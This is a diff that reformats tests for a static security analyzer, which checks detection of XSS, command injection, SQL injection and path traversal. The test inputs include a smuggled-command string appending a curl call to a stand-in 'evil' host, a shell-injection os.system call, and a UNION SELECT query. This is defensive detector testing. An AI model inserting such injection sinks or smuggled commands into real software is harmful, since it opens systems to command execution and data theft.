@@ -277,13 +277,29 @@ fn test_security_analyzer_antipattern_hit_format() {
 fn a_commented_payload_does_not_hide_the_real_sink_below_it() {
     let source = "// the old template said <script>\nfn page(u: &str) -> String { format!(\"<script>{u}</script>\") }\n";
     let report = SecurityAnalyzer::new().analyze(source, "rust");
-    let xss: Vec<&VulnMatch> = report.vuln_matches.iter().filter(|m| m.pattern_name == "XSS").collect();
-    assert_eq!(xss.len(), 1, "one finding per pattern: {:?}", report.vuln_matches);
-    assert!(xss[0].span.0 > source.find('\n').expect("two lines"), "the sink, not the comment");
+    let xss: Vec<&VulnMatch> = report
+        .vuln_matches
+        .iter()
+        .filter(|m| m.pattern_name == "XSS")
+        .collect();
+    assert_eq!(
+        xss.len(),
+        1,
+        "one finding per pattern: {:?}",
+        report.vuln_matches
+    );
+    assert!(
+        xss[0].span.0 > source.find('\n').expect("two lines"),
+        "the sink, not the comment"
+    );
     let twice = "let a = \"<script>x()</script>\";\nlet b = \"<script>y()</script>\";\n";
     let report = SecurityAnalyzer::new().analyze(twice, "rust");
     assert_eq!(
-        report.vuln_matches.iter().filter(|m| m.pattern_name == "XSS").count(),
+        report
+            .vuln_matches
+            .iter()
+            .filter(|m| m.pattern_name == "XSS")
+            .count(),
         1,
         "two sinks of one pattern are one finding, as the score has always read them"
     );
@@ -294,10 +310,23 @@ fn a_commented_payload_does_not_hide_the_real_sink_below_it() {
 fn shell_operators_are_not_command_injection_in_a_shell_script() {
     let script = "#!/bin/sh\ncurl -o a \"$u.sig\" && curl -o b \"$u.pem\"; rm -f tmp.$$\n";
     let shell = SecurityAnalyzer::new().analyze(script, "shell");
-    assert!(shell.vuln_matches.iter().all(|m| m.pattern_name != "CMDi"), "{:?}", shell.vuln_matches);
-    let smuggled = SecurityAnalyzer::new().analyze("cmd = user + \" && curl http://evil \"\n", "python");
-    assert!(smuggled.vuln_matches.iter().any(|m| m.pattern_name == "CMDi"));
-    let exec = SecurityAnalyzer::new().analyze("python3 -c 'import os; os.system(f\"ping {h}\")'\n", "shell");
+    assert!(
+        shell.vuln_matches.iter().all(|m| m.pattern_name != "CMDi"),
+        "{:?}",
+        shell.vuln_matches
+    );
+    let smuggled =
+        SecurityAnalyzer::new().analyze("cmd = user + \" && curl http://evil \"\n", "python");
+    assert!(
+        smuggled
+            .vuln_matches
+            .iter()
+            .any(|m| m.pattern_name == "CMDi")
+    );
+    let exec = SecurityAnalyzer::new().analyze(
+        "python3 -c 'import os; os.system(f\"ping {h}\")'\n",
+        "shell",
+    );
     assert!(exec.vuln_matches.iter().any(|m| m.pattern_name == "CMDi"));
 }
 
@@ -305,7 +334,12 @@ fn shell_operators_are_not_command_injection_in_a_shell_script() {
 #[test]
 fn python_docstrings_do_not_reach_a_sink_but_triple_quoted_arguments_do() {
     let doc = "\"\"\"Tool.\n\nRenders inline <script> blocks.\n\"\"\"\nimport json\n";
-    assert!(SecurityAnalyzer::new().analyze(doc, "python").vuln_matches.is_empty());
+    assert!(
+        SecurityAnalyzer::new()
+            .analyze(doc, "python")
+            .vuln_matches
+            .is_empty()
+    );
     let arg = "cur.execute(\n    \"\"\"SELECT a FROM t UNION SELECT b FROM u\"\"\"\n)\n";
     let report = SecurityAnalyzer::new().analyze(arg, "python");
     assert!(report.vuln_matches.iter().any(|m| m.pattern_name == "SQLi"));
@@ -340,5 +374,8 @@ fn a_climb_from_the_scripts_own_directory_is_not_traversal_but_one_from_input_is
         assert!(traversal(from_input, "shell"), "{from_input}");
     }
     // The exemption is shell syntax: the same text in Python still counts.
-    assert!(traversal("path = f\"$(dirname \\\"$0\\\")/../../..\"\n", "python"));
+    assert!(traversal(
+        "path = f\"$(dirname \\\"$0\\\")/../../..\"\n",
+        "python"
+    ));
 }
